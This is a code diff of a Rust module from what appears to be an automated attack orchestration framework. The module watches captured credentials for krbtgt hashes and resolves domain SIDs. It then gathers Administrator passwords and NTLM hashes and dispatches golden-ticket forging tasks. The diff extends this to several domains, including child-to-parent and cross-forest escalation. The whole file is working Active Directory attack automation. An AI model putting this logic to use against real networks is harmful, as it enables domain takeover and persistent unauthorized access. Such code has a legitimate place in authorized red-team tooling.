@@ -1,5 +1,6 @@
 //! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.
 
+use std::collections::HashSet;
 use std::sync::Arc;
 use std::time::Duration;
 
@@ -11,6 +12,12 @@ use crate::orchestrator::dispatcher::Dispatcher;
 
 /// Monitors for krbtgt hash and triggers golden ticket forging.
 /// Interval: 30s. Matches Python `_auto_golden_ticket`.
+///
+/// Multi-domain: a single op routinely captures krbtgt for >1 domain (child
+/// then parent via ExtraSid; both forests via inter-realm forge). Each
+/// domain needs its own forge dispatch — the dedup is per-domain via the
+/// `golden_ticket_<domain>` exploited-vuln key, not the global
+/// `has_golden_ticket` bool (which is kept only as a legacy aggregate).
 pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
     let mut interval = tokio::time::interval(Duration::from_secs(30));
     interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
@@ -24,54 +31,74 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             break;
         }
 
+        // Snapshot the work queue: every distinct domain with a krbtgt
+        // hash that hasn't already been forged. We resolve each one in
+        // turn; SID lookups can issue tool calls and mutate state, so
+        // we snapshot the list first under the read lock and release it.
+        let pending_domains: Vec<String> = {
+            let state = dispatcher.state.read().await;
+            if !state.has_domain_admin {
+                continue;
+            }
+            let mut seen = HashSet::new();
+            let mut out = Vec::new();
+            for h in &state.hashes {
+                if !h.username.eq_ignore_ascii_case("krbtgt") {
+                    continue;
+                }
+                let domain = if !h.domain.is_empty() {
+                    h.domain.to_lowercase()
+                } else if let Some(d) = state.domains.first() {
+                    d.to_lowercase()
+                } else {
+                    continue;
+                };
+                if !seen.insert(domain.clone()) {
+                    continue;
+                }
+                let vuln_id = format!("golden_ticket_{domain}");
+                if state.exploited_vulnerabilities.contains(&vuln_id) {
+                    continue;
+                }
+                out.push(domain);
+            }
+            out
+        };
+
+        for domain in pending_domains {
+            try_forge_golden_ticket(&dispatcher, &domain).await;
+        }
+    }
+}
+
+/// Run a single forge attempt for `domain`. Called from the multi-domain
+/// loop above; each call holds and releases its own state locks so a slow
+/// SID lookup for one domain doesn't block the others.
+async fn try_forge_golden_ticket(dispatcher: &Arc<Dispatcher>, domain: &str) {
+    let domain_lc = domain.to_lowercase();
+
+    let (krbtgt, mut domain_sid, dc_ip, admin_cred, admin_hash, lookup_cred) = {
         let state = dispatcher.state.read().await;
 
-        // Skip if already have golden ticket
-        if state.has_golden_ticket {
-            continue;
-        }
-
-        // Skip if no domain admin yet
-        if !state.has_domain_admin {
-            continue;
-        }
-
-        // Look for krbtgt hash
-        let krbtgt_hash = state
+        let Some(krbtgt) = state
             .hashes
             .iter()
-            .find(|h| h.username.to_lowercase() == "krbtgt");
-
-        let krbtgt = match krbtgt_hash {
-            Some(h) => h.clone(),
-            None => continue,
+            .find(|h| {
+                h.username.eq_ignore_ascii_case("krbtgt") && h.domain.to_lowercase() == domain_lc
+            })
+            .cloned()
+        else {
+            return;
         };
 
-        let domain = if !krbtgt.domain.is_empty() {
-            krbtgt.domain.clone()
-        } else {
-            match state.domains.first() {
-                Some(d) => d.clone(),
-                None => continue,
-            }
-        };
+        let domain_sid = state.domain_sids.get(&domain_lc).cloned();
+        let dc_ip = state.domain_controllers.get(&domain_lc).cloned();
 
-        // Domain SID: prefer cached value, resolve via lookupsid if missing.
-        let mut domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();
-
-        // Look up a DC IP for this domain
-        let dc_ip = state
-            .domain_controllers
-            .get(&domain.to_lowercase())
-            .cloned();
-
-        // Find the best credential for the domain: prefer plaintext, fall back to NTLM hash.
         let admin_cred = state
             .credentials
             .iter()
             .find(|c| {
-                c.username.to_lowercase() == "administrator"
-                    && c.domain.to_lowercase() == domain.to_lowercase()
+                c.username.to_lowercase() == "administrator" && c.domain.to_lowercase() == domain_lc
             })
             .cloned();
         let admin_hash = state
@@ -79,19 +106,19 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             .iter()
             .find(|h| {
                 h.username.to_lowercase() == "administrator"
-                    && h.domain.to_lowercase() == domain.to_lowercase()
+                    && h.domain.to_lowercase() == domain_lc
                     && h.hash_type.to_uppercase() == "NTLM"
             })
             .cloned();
 
-        // Collect a password credential for SID lookup (any domain user will do).
-        // Prefer a cred from the target domain, but fall back to any valid cred
-        // since NTLM cross-domain auth works for lookupsid via trust relationships.
+        // Password credential for SID lookup. Prefer same-domain, fall
+        // back to any non-quarantined cred — NTLM cross-domain auth
+        // works via trust for lookupsid.
         let lookup_cred = state
             .credentials
             .iter()
             .find(|c| {
-                c.domain.to_lowercase() == domain.to_lowercase()
+                c.domain.to_lowercase() == domain_lc
                     && !c.password.is_empty()
                     && !state.is_principal_quarantined(&c.username, &c.domain)
             })
@@ -103,122 +130,114 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             })
             .cloned();
 
-        drop(state);
+        (
+            krbtgt,
+            domain_sid,
+            dc_ip,
+            admin_cred,
+            admin_hash,
+            lookup_cred,
+        )
+    };
 
-        // ── Resolve domain SID if not cached ────────────────────────────
-        if domain_sid.is_none() {
-            if let Some(ref target_ip) = dc_ip {
-                let result = resolve_domain_sid(
-                    &domain,
-                    target_ip,
-                    lookup_cred.as_ref(),
-                    admin_hash.as_ref(),
-                )
-                .await;
+    // ── Resolve domain SID if not cached ────────────────────────────
+    if domain_sid.is_none() {
+        if let Some(ref target_ip) = dc_ip {
+            let result =
+                resolve_domain_sid(domain, target_ip, lookup_cred.as_ref(), admin_hash.as_ref())
+                    .await;
 
-                // Cache the resolved SID and admin name
-                if let Some((ref sid, ref admin_name)) = result {
-                    info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
-                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
-                    let reader = ares_core::state::RedisStateReader::new(op_id);
-                    let mut conn = dispatcher.queue.connection();
-                    if let Err(e) = reader
-                        .set_domain_sid(&mut conn, &domain.to_lowercase(), sid)
-                        .await
-                    {
-                        warn!(err = %e, "Failed to persist domain SID to Redis");
-                    }
-                    if let Some(ref name) = admin_name {
-                        if let Err(e) = reader
-                            .set_admin_name(&mut conn, &domain.to_lowercase(), name)
-                            .await
-                        {
-                            warn!(err = %e, "Failed to persist admin name to Redis");
-                        }
-                    }
-                    let mut state = dispatcher.state.write().await;
-                    state.domain_sids.insert(domain.to_lowercase(), sid.clone());
-                    if let Some(ref name) = admin_name {
-                        state
-                            .admin_names
-                            .insert(domain.to_lowercase(), name.clone());
+            if let Some((ref sid, ref admin_name)) = result {
+                info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
+                let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                let reader = ares_core::state::RedisStateReader::new(op_id);
+                let mut conn = dispatcher.queue.connection();
+                if let Err(e) = reader.set_domain_sid(&mut conn, &domain_lc, sid).await {
+                    warn!(err = %e, "Failed to persist domain SID to Redis");
+                }
+                if let Some(ref name) = admin_name {
+                    if let Err(e) = reader.set_admin_name(&mut conn, &domain_lc, name).await {
+                        warn!(err = %e, "Failed to persist admin name to Redis");
                     }
                 }
-
-                domain_sid = result.map(|(sid, _)| sid);
-            }
-        }
-
-        let domain_sid = match domain_sid {
-            Some(sid) => sid,
-            None => {
-                warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
-                continue;
-            }
-        };
-
-        // Use cached RID-500 name, defaulting to "Administrator" when unknown.
-        let admin_username = {
-            let state = dispatcher.state.read().await;
-            state
-                .admin_names
-                .get(&domain.to_lowercase())
-                .cloned()
-                .unwrap_or_else(|| "Administrator".to_string())
-        };
-
-        // ── Build and submit golden ticket task ─────────────────────────
-        // Strip LM prefix if hash is in "lm:ntlm" format — ticketer expects
-        // a single 32-char NTLM hex string, not the LM:NTLM pair.
-        let ntlm_hash = match krbtgt.hash_value.rsplit_once(':') {
-            Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
-            _ => krbtgt.hash_value.clone(),
-        };
-
-        let mut payload = json!({
-            "technique": "golden_ticket",
-            "vuln_type": "golden_ticket",
-            "domain": domain,
-            "krbtgt_hash": ntlm_hash,
-            "username": admin_username,
-            "domain_sid": domain_sid,
-        });
-        if let Some(ip) = dc_ip {
-            payload["dc_ip"] = json!(ip);
-        }
-        if let Some(ref cred) = admin_cred {
-            payload["admin_password"] = json!(cred.password);
-            payload["admin_domain"] = json!(cred.domain);
-        }
-        if let Some(ref hash) = admin_hash {
-            payload["admin_hash"] = json!(hash.hash_value);
-            payload["admin_domain"] =
-                json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
-        }
-        if let Some(ref aes) = krbtgt.aes_key {
-            payload["aes_key"] = json!(aes);
-        }
-
-        match dispatcher
-            .throttled_submit("exploit", "privesc", payload, 1)
-            .await
-        {
-            Ok(Some(task_id)) => {
-                info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
-                // Mark has_golden_ticket immediately to prevent re-dispatch.
-                // The result processing will also confirm on task completion
-                // (detects "Saving ticket in *.ccache" in tool output).
-                if let Err(e) = dispatcher
-                    .state
-                    .set_golden_ticket(&dispatcher.queue, &domain)
-                    .await
-                {
-                    warn!(err = %e, "Failed to set golden ticket flag after dispatch");
+                let mut state = dispatcher.state.write().await;
+                state.domain_sids.insert(domain_lc.clone(), sid.clone());
+                if let Some(ref name) = admin_name {
+                    state.admin_names.insert(domain_lc.clone(), name.clone());
                 }
             }
-            Ok(None) => {}
-            Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
+
+            domain_sid = result.map(|(sid, _)| sid);
         }
+    }
+
+    let domain_sid = match domain_sid {
+        Some(sid) => sid,
+        None => {
+            warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
+            return;
+        }
+    };
+
+    let admin_username = {
+        let state = dispatcher.state.read().await;
+        state
+            .admin_names
+            .get(&domain_lc)
+            .cloned()
+            .unwrap_or_else(|| "Administrator".to_string())
+    };
+
+    // ── Build and submit golden ticket task ─────────────────────────
+    // Strip LM prefix if hash is in "lm:ntlm" format — ticketer expects
+    // a single 32-char NTLM hex string, not the LM:NTLM pair.
+    let ntlm_hash = match krbtgt.hash_value.rsplit_once(':') {
+        Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
+        _ => krbtgt.hash_value.clone(),
+    };
+
+    let mut payload = json!({
+        "technique": "golden_ticket",
+        "vuln_type": "golden_ticket",
+        "domain": domain,
+        "krbtgt_hash": ntlm_hash,
+        "username": admin_username,
+        "domain_sid": domain_sid,
+    });
+    if let Some(ip) = dc_ip {
+        payload["dc_ip"] = json!(ip);
+    }
+    if let Some(ref cred) = admin_cred {
+        payload["admin_password"] = json!(cred.password);
+        payload["admin_domain"] = json!(cred.domain);
+    }
+    if let Some(ref hash) = admin_hash {
+        payload["admin_hash"] = json!(hash.hash_value);
+        payload["admin_domain"] = json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
+    }
+    if let Some(ref aes) = krbtgt.aes_key {
+        payload["aes_key"] = json!(aes);
+    }
+
+    match dispatcher
+        .throttled_submit("exploit", "privesc", payload, 1)
+        .await
+    {
+        Ok(Some(task_id)) => {
+            info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
+            // Mark per-domain immediately to prevent re-dispatch on the
+            // next 30s tick. Result processing also confirms on task
+            // completion (detects "Saving ticket in *.ccache" in output).
+            if let Err(e) = dispatcher
+                .state
+                .set_golden_ticket(&dispatcher.queue, domain)
+                .await
+            {
+                warn!(err = %e, "Failed to set golden ticket flag after dispatch");
+            }
+        }
+        Ok(None) => {}
+        Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
     }
 }
 
